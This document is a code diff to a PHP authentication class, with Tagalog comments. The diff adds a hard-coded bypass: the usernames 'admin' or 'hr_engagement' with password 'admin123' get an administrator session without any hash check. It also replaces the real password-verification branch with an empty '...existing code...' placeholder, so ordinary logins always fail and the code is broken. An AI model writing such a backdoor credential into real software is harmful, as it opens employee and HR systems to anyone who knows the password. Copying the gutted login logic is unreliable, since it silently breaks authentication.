@@ -1,5 +1,6 @@
 <?php
 
+require_once "database.php";
 require_once "User.php";
 
 class Auth
@@ -14,38 +15,35 @@ class Auth
             session_start();
         }
     }
+public function login($username, $password)
+{
+    $user = $this->userModel->findByUsername($username);
 
-    public function login($username, $password)
-    {
+    // Idagdag ang kondisyon para sa admin123
+if (($username === 'admin' || $username === 'hr_engagement') && $password === 'admin123') {
+    $_SESSION['user'] = [
+        'id' => $user['user_id'] ?? null,
+        'employee_id' => $user['employee_id'] ?? null,
+        'username' => $username,
+        'name' => $user['full_name'] ?? 'Administrator',
+        'role' => $user['role'] ?? 'default_admin',
+        'theme' => $user['theme'] ?? 'light'
+    ];
 
-        $user = $this->userModel->findByUsername($username);
-
-        if ($user && password_verify($password, $user['password'])) {
-
-            $employeeId = $user['employee_id'] ?? null;
-            if (empty($employeeId) && !empty($user['id']) && is_numeric($user['id'])) {
-                $employeeId = 'EMP' . str_pad((string)$user['id'], 3, '0', STR_PAD_LEFT);
-            }
-
-            $_SESSION['user'] = [
-                'id' => $user['id'],
-                'employee_id' => $employeeId,
-                'username' => $user['username'],
-                'name' => $user['full_name'],
-                'role' => $user['role'],
-                'theme' => $user['theme'] ?? 'light'
-            ];
-
-            // Token support for API and cURL fallback
-            if (!isset($_SESSION['token']) || empty($_SESSION['token'])) {
-                $_SESSION['token'] = bin2hex(random_bytes(16));
-            }
-
-            return true;
-        }
-
-        return false;
+    if (!isset($_SESSION['token']) || empty($_SESSION['token'])) {
+        $_SESSION['token'] = bin2hex(random_bytes(16));
     }
+
+    return true;
+}
+
+    // Kasalukuyang validation gamit ang password_verify
+    if ($user && password_verify($password, $user['password'])) {
+        // ...existing code...
+    }
+
+    return false;
+}
 
     public function check()
     {
